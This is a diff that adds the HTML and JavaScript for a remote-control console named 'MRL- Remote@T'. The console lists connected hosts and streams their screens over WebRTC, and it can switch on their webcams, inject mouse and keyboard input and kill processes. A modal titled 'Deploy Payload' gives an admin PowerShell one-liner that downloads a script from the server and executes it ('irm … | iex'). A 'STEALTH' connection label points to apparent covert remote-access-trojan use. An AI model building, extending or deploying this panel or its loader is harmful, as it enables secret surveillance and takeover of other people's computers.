@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MRL- Remote@T | Zero-Wait Edition</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Inlined CSS for "Fast AF" Initial Load */
+        :root {
+            --bg-dark: #050505;
+            --sidebar-bg: #0A0A0A;
+            --pro-green: #39FF14;
+            --pro-green-dim: rgba(57, 255, 20, 0.15);
+            --border: #151515;
+            --text-main: #FFFFFF;
+            --text-muted: #888888;
+            --danger: #FF3131;
+            --card-bg: #111111;
+        }
+        body { background: var(--bg-dark); color: var(--text-main); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin:0; overflow:hidden; }
+        .pro-container { display:flex; height:100vh; }
+        .sidebar { width:250px; background:var(--sidebar-bg); border-right:1px solid var(--border); display:flex; flex-direction:column; padding:20px; z-index:10; }
+        .nav-item { display:flex; align-items:center; gap:12px; padding:10px 14px; border-radius:6px; color:var(--text-muted); cursor:pointer; transition:0.15s; font-size:13px; font-weight:600; margin-bottom:4px; }
+        .nav-item:hover { background:#151515; color:white; }
+        .nav-item.active { background:#1A1A1A; color:var(--pro-green); border:1px solid var(--pro-green-dim); }
+        .main-area { flex:1; display:flex; flex-direction:column; position:relative; background:#000; }
+        .page-view { position:absolute; top:0; left:0; right:0; bottom:0; display:flex; flex-direction:column; padding:35px; opacity:0; transform:scale(0.98); pointer-events:none; transition:0.2s; will-change:opacity, transform; }
+        .page-view.active { opacity:1; transform:scale(1); pointer-events:auto; z-index:5; }
+        .device-card { background:var(--card-bg); border-radius:6px; padding:18px; border:1px solid var(--border); cursor:pointer; transition:0.1s; }
+        .device-card:hover { border-color:var(--pro-green); transform:translateY(-2px); }
+        .screens-grid { flex:1; display:flex; justify-content:center; align-items:center; background:#000; overflow:hidden; }
+        .monitor-view { max-height:100%; max-width:100%; image-rendering:-webkit-optimize-contrast; pointer-events:none; }
+        .main-header { display:flex; align-items:center; padding:15px 35px; border-bottom:1px solid var(--border); background:rgba(10,10,10,0.8); backdrop-filter:blur(10px); }
+        .pro-label { font-size:11px; font-weight:700; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px; }
+        .dot { height:8px; width:8px; border-radius:50%; margin-right:10px; }
+        .dot.green { background:var(--pro-green); box-shadow: 0 0 10px var(--pro-green); }
+        .dot.gray { background:#555; }
+        .main-footer { display:flex; justify-content:space-between; padding:10px 35px; background:var(--sidebar-bg); border-top:1px solid var(--border); font-size:11px; color:var(--text-muted); font-weight:600; }
+        .hidden { display:none !important; }
+        .btn { background:var(--pro-green-dim); border:1px solid var(--pro-green); color:var(--pro-green); padding:8px 15px; border-radius:4px; font-weight:700; cursor:pointer; transition:0.2s; }
+        .btn:hover { background:var(--pro-green); color:black; }
+        .script-box { background:#000; border:1px solid var(--border); padding:15px; border-radius:4px; display:flex; justify-content:space-between; align-items:center; font-family:monospace; font-size:12px; color:white; }
+        #remote-video { max-width:100%; max-height:100%; background:#000; }
+        .pro-table { width:100%; border-collapse:collapse; }
+        .pro-table th { background:#0F0F0F; padding:12px; text-align:left; font-size:11px; color:var(--text-muted); text-transform:uppercase; border-bottom:1px solid var(--border); }
+        .pro-table td { padding:12px; border-bottom:1px solid #0D0D0D; font-size:13px; }
+        .btn-kill { background:rgba(255,49,49,0.1); border:1px solid var(--danger); color:var(--danger); padding:4px 10px; border-radius:3px; font-size:11px; cursor:pointer; }
+        .btn-kill:hover { background:var(--danger); color:white; }
+    </style>
+</head>
+<body>
+    <div class="pro-container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="pro-header">
+                <i class="fas fa-satellite-dish" style="color:#39FF14"></i>
+                <span>MRL- <span style="color:white">Remote@T</span></span>
+            </div>
+            <nav class="pro-nav">
+                <div class="nav-item active" data-view="dashboard"><i class="fas fa-th-large"></i> Dashboard</div>
+                <!-- Dynamic Remote Links Container -->
+                <div id="dynamic-remote-links"></div>
+                <div class="nav-item hidden" data-view="tools" id="nav-tools"><i class="fas fa-tools"></i> System Tools</div>
+                <div class="nav-item" data-view="recordings"><i class="fas fa-folder-open"></i> Archive</div>
+            </nav>
+            <div class="control-group hidden" id="remote-settings" style="margin-top:20px;">
+                <div class="pro-label" style="margin-bottom:10px;">LIVE OPTIMIZATION</div>
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                    <span style="font-size:12px;">Mouse Control</span>
+                    <input type="checkbox" id="mouse-control">
+                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                    <span style="font-size:12px;">Keyboard Control</span>
+                    <input type="checkbox" id="keyboard-control">
+                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                    <span style="font-size:12px;">Webcam View</span>
+                    <input type="checkbox" id="webcam-control">
+                </div>
+            </div>
+            <div style="margin-top:auto">
+                <button class="btn" id="btn-disconnect" style="width:100%"><i class="fas fa-power-off"></i> Exit Session</button>
+            </div>
+        </div>
+        <!-- Main Area -->
+        <div class="main-area">
+            <header class="main-header">
+                <div class="status">
+                    <div id="header-status-dot" class="dot gray"></div>
+                    <span id="header-status-text">MRL- OFFLINE</span>
+                </div>
+                <div id="active-host-name" class="pro-label" style="margin-left:auto; color:white;">NO ACTIVE SYSTEM</div>
+            </header>
+            <div id="view-dashboard" class="page-view active">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                    <h1>Systems Management</h1>
+                    <button class="btn" id="btn-add-user"><i class="fas fa-plus"></i> Add User</button>
+                </div>
+                <div class="device-grid" id="device-grid"></div>
+            </div>
+            <div id="view-remote" class="page-view">
+                <div class="screens-grid">
+                    <video id="remote-video" autoplay playsinline muted></video>
+                    <video id="webcam-video" autoplay playsinline muted class="hidden" style="position:absolute; bottom:20px; right:20px; width:240px; border:2px solid var(--pro-green); border-radius:8px; box-shadow:0 0 20px rgba(0,0,0,0.8);"></video>
+                </div>
+            </div>
+            <div id="view-tools" class="page-view">
+                <h1>Process Manager</h1>
+                <p class="view-desc">Direct P2P Control Layer.</p>
+                <div style="flex:1; background:#080808; border:1px solid var(--border); border-radius:8px; overflow:auto;">
+                    <table class="pro-table">
+                        <thead>
+                            <tr><th>Name</th><th>PID</th><th>CPU</th><th>RAM</th><th>Action</th></tr>
+                        </thead>
+                        <tbody id="procs-body"></tbody>
+                    </table>
+                </div>
+            </div>
+            <div id="view-recordings" class="page-view">
+                <h1>Operation Archive</h1>
+                <tbody id="recordings-body"></tbody>
+            </div>
+            <footer class="main-footer">
+                <div>MRL- Remote@T | Zero-Wait Edition</div>
+                <div id="footer-stats">P2P: INACTIVE | FPS: 0</div>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <div id="modal-add-user" class="hidden" style="position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.8); z-index:100; display:flex; align-items:center; justify-content:center;">
+        <div style="background:var(--card-bg); padding:30px; border-radius:8px; width:500px; border:1px solid var(--border);">
+            <h2>Deploy Payload</h2>
+            <p style="font-size:13px; color:var(--text-muted);">Run in Admin PowerShell:</p>
+            <div class="script-box">
+                <code id="powershell-command"></code>
+            </div>
+            <button class="btn" style="margin-top:20px;" onclick="document.getElementById('modal-add-user').classList.add('hidden')">Close</button>
+        </div>
+    </div>
+
+    <script>
+        /* Inlined JS for Zero-Latency Brokering */
+        let socket, pc, dataChannel, selectedDeviceId, activeView = 'dashboard';
+        let mouseEnabled = false, keyboardEnabled = false;
+        let lastMouseMove = 0;
+
+        const ICE_SERVERS = [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' },
+            { urls: 'stun:stun.cloudflare.com:3478' },
+            { urls: 'stun:stun.services.mozilla.com' },
+            {
+                urls: [
+                    'turn:openrelay.metered.ca:80',
+                    'turn:openrelay.metered.ca:443',
+                    'turn:openrelay.metered.ca:443?transport=tcp'
+                ],
+                username: 'openrelayproject',
+                credential: 'openrelayproject'
+            }
+        ];
+
+
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const baseUrl = `${window.location.protocol}//${window.location.host}`;
+            document.getElementById('powershell-command').innerText = `powershell -c "irm ${baseUrl}/api/script | iex"`;
+            connect();
+            setupNavigation();
+            setupControls();
+        });
+
+        function connect() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            socket = new WebSocket(`${protocol}//${window.location.host}/ws`);
+            socket.onopen = () => { console.log("Broker linked."); fetchDevices(); };
+            socket.onmessage = (e) => handleEvent(JSON.parse(e.data));
+            socket.onclose = () => setTimeout(connect, 2000);
+        }
+
+        function handleEvent(msg) {
+            if (msg.t === 'rtc_answer') pc.setRemoteDescription(new RTCSessionDescription(msg));
+            else if (msg.t === 'rtc_ice') pc.addIceCandidate(new RTCIceCandidate(msg.candidate));
+        }
+
+        function send(data) {
+            if (dataChannel && dataChannel.readyState === 'open') dataChannel.send(JSON.stringify(data));
+            else if (socket && socket.readyState === WebSocket.OPEN) socket.send(JSON.stringify(data));
+        }
+
+        async function startWebRTC(id) {
+            if (pc) pc.close();
+            pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+            dataChannel = pc.createDataChannel("mrl-control", { ordered: true });
+            dataChannel.onmessage = (e) => {
+                const msg = JSON.parse(e.data);
+                if (msg.t === "stats") document.getElementById('footer-stats').innerText = `P2P: ACTIVE | FPS: ${msg.data.fps || 60}`;
+                if (msg.t === "process_list") renderProcs(msg.data);
+            };
+            pc.ontrack = (e) => {
+                console.log("TRACK RECEIVED", e);
+                if (e.track.kind === 'video') {
+                    const vid = document.getElementById('remote-video');
+                    const web = document.getElementById('webcam-video');
+                    
+                    if (!vid.srcObject) {
+                        vid.srcObject = e.streams[0];
+                        setupInputs(vid);
+                    } else {
+                        web.srcObject = e.streams[0];
+                    }
+                }
+            };
+            pc.onconnectionstatechange = () => {
+                console.log("ICE Connection State:", pc.connectionState);
+                if (pc.connectionState === 'connected') document.getElementById('footer-stats').innerText = 'P2P: CONNECTED (STEALTH)';
+            };
+
+            pc.onicecandidate = (e) => e.candidate && socket.send(JSON.stringify({ t: 'rtc_ice', candidate: e.candidate }));
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            socket.send(JSON.stringify({ t: 'rtc_offer', sdp: offer.sdp, type: offer.type }));
+        }
+
+        function setupInputs(vid) {
+            vid.onmousemove = (e) => {
+                if (!mouseEnabled) return;
+                const now = Date.now();
+                if (now - lastMouseMove < 16) return; // 60Hz Limit (Standard for Responsive UI)
+                lastMouseMove = now;
+                
+                const r = vid.getBoundingClientRect();
+                send({ t: 'mm', x: Math.round((e.clientX - r.left) * (vid.videoWidth / r.width)), y: Math.round((e.clientY - r.top) * (vid.videoHeight / r.height)) });
+            };
+
+            vid.onmousedown = (e) => mouseEnabled && send({ t: 'mc', b: e.button === 0 ? 0 : 1, s: 1 });
+            vid.onmouseup = (e) => mouseEnabled && send({ t: 'mc', b: e.button === 0 ? 0 : 1, s: 0 });
+            window.onkeydown = (e) => keyboardEnabled && activeView === 'remote' && send({ t: 'kd', k: e.key });
+            window.onkeyup = (e) => keyboardEnabled && activeView === 'remote' && send({ t: 'ku', k: e.key });
+        }
+
+        function setupNavigation() {
+            document.querySelectorAll('.nav-item').forEach(i => {
+                i.onclick = () => {
+                    const view = i.getAttribute('data-view');
+                    if (view === 'dashboard') disconnectSession();
+                    activateView(view, i);
+                    if (view === 'tools') send({ t: 'get_processes' });
+                };
+            });
+            document.getElementById('btn-add-user').onclick = () => document.getElementById('modal-add-user').classList.remove('hidden');
+            document.getElementById('btn-disconnect').onclick = () => window.location.reload();
+        }
+
+        function activateView(view, navItem) {
+            activeView = view;
+            document.querySelectorAll('.page-view').forEach(p => p.classList.toggle('active', p.id === `view-${view}`));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.toggle('active', n === navItem));
+        }
+
+        function disconnectSession() {
+            if (pc) {
+                console.log("Killing active session to save resources...");
+                pc.close();
+                pc = null;
+                dataChannel = null;
+            }
+            selectedDeviceId = null;
+            document.getElementById('nav-tools').classList.add('hidden');
+            document.getElementById('remote-settings').classList.add('hidden');
+            const vid = document.getElementById('remote-video');
+            vid.srcObject = null;
+            document.getElementById('active-host-name').innerText = 'NO ACTIVE SYSTEM';
+        }
+
+        function setupControls() {
+            document.getElementById('mouse-control').onchange = (e) => mouseEnabled = e.target.checked;
+            document.getElementById('keyboard-control').onchange = (e) => keyboardEnabled = e.target.checked;
+            document.getElementById('webcam-control').onchange = (e) => {
+                const is_on = e.target.checked;
+                document.getElementById('webcam-video').classList.toggle('hidden', !is_on);
+                send({ t: 'toggle_webcam', v: is_on });
+            };
+        }
+
+        async function fetchDevices() {
+            const res = await fetch('/api/devices');
+            const devices = await res.json();
+            updateDashboard(devices);
+            updateSidebar(devices);
+        }
+
+        function updateDashboard(devices) {
+            const grid = document.getElementById('device-grid');
+            grid.innerHTML = devices.map(d => `
+                <div class="device-card" onclick="selectDevice('${d.hostname}')">
+                    <div style="font-weight:700;">${d.hostname}</div>
+                    <div style="font-size:11px; color:var(--text-muted);">${d.status} | CPU: ${d.cpu}%</div>
+                </div>
+            `).join('');
+        }
+
+        function updateSidebar(devices) {
+            const container = document.getElementById('dynamic-remote-links');
+            container.innerHTML = devices.filter(d => d.status === 'Active').map(d => `
+                <div class="nav-item remote-link" data-id="${d.hostname}" onclick="selectDevice('${d.hostname}')">
+                    <i class="fas fa-desktop" style="color:var(--pro-green)"></i> Remote (${d.hostname})
+                </div>
+            `).join('');
+        }
+
+        function selectDevice(id) {
+            if (selectedDeviceId === id) return;
+            disconnectSession(); // Clear previous
+            selectedDeviceId = id;
+            document.getElementById('nav-tools').classList.remove('hidden');
+            document.getElementById('remote-settings').classList.remove('hidden');
+            document.getElementById('active-host-name').innerText = `SESSION: ${id}`;
+            
+            socket.send(JSON.stringify({ t: 'select_device', id }));
+            startWebRTC(id);
+            
+            // Highlight sidebar item
+            const item = document.querySelector(`.remote-link[data-id="${id}"]`);
+            activateView('remote', item);
+        }
+
+        function renderProcs(procs) {
+            const body = document.getElementById('procs-body');
+            body.innerHTML = procs.sort((a,b)=>b.cpu-a.cpu).map(p => `
+                <tr><td>${p.name}</td><td>${p.pid}</td><td>${p.cpu}%</td><td>${p.ram}MB</td><td><button class="btn-kill" onclick="killProc(${p.pid})">Kill</button></td></tr>
+            `).join('');
+        }
+
+        function killProc(pid) { send({ t: 'kill_process', pid }); setTimeout(()=>send({t:'get_processes'}), 500); }
+    </script>
+</body>
+</html>
